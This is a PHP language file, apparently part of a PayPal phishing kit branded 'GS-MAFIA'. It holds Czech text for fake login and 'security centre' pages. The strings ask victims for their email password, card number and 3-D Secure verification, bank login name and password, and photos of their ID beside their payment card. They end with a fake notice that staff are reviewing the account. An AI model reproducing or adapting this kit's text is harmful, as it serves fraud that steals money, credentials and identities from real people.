<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "E-mail";
$gs_string2 = "Další";
$gs_string3 = "Máte problémy se přihlášením?";
$gs_string4 = "nebo";
$gs_string5 = "Registrace";
$gs_string6 = "Kontaktujte nás";
$gs_string7 = "Soukromí";
$gs_string8 = "Právní";
$gs_string9 = "Celosvětový";
$gs_string10 = "Změna";
$gs_string11 = "Přihlášení";
$gs_string12 = "Vaše bezpečnost je naší hlavní prioritou";
$gs_string13 = "Aktualizovat fakturační adresu";
$gs_string14 = "Jméno";
$gs_string15 = "Příjmení";
$gs_string16 = "Adresa ulice";
$gs_string17 = "Město";
$gs_string18 = "PSČ";
$gs_string19 = "Pokračovat";
$gs_string20 = "Zpětná vazba";
$gs_string21 = "Aktualizovat informace o kartě";
$gs_string22 = "Jméno držitele karty";
$gs_string23 = "Měsíc";
$gs_string24 = "rok";
$gs_string25 = "3-D bezpečné ověření";
$gs_string26 = "Aktualizace vašeho e-mailového přístupu";
$gs_string27 = "E-mailová adresa";
$gs_string28 = "Heslo e-mailové adresy";
$gs_string29 = "Připojit kopii vašeho průkazu totožnosti";
$gs_string30 = "Připojit obrázek vaší karty (zadní / přední strana)";
$gs_string31 = "Dokončit";
$gs_string32 = "Heslo";
$gs_string33 = "Informace o kartě";
$gs_string34 = "číslo karty";
$gs_string35 = "Země";
$gs_string36 = "Blahopřejeme";
$gs_string37 = "<center> Vaše podané informace o účtu jsou kontrolovány našimi zaměstnanci. <br> <br> <br> <br> <br> <br> <br> <b> Děkujeme, že jste si vybrali PayRal. </ B> <br> <br> <center> <br> <b> Budete přesměrováni, abyste se přihlásili k vašemu účtu PayRal ... </ b> <br> <br> ";
$gs_string38 = "Ověření účtu - Centrum zabezpečení";
$gs_string39 = "Přihlaste se do účtu PayPal";
$gs_string40 = "Ověření účtu - Centrum zabezpečení";
$gs_stringbk26 = "Aktualizovat bankovní přihlášení";
$gs_stringbk27 = "Přihlašovací jméno uživatele";
$gs_stringbk28 = "Přihlašovací heslo";
$gs_stringbk29 = "Jméno banky";
$gs_idsub = "Potvrďte prosím totožnost";
$gs_idsub2 = "Fotografie dokladu totožnosti (obě strany pro řidičský průkaz nebo průkaz totožnosti) vedle přední strany platební karty.";
?>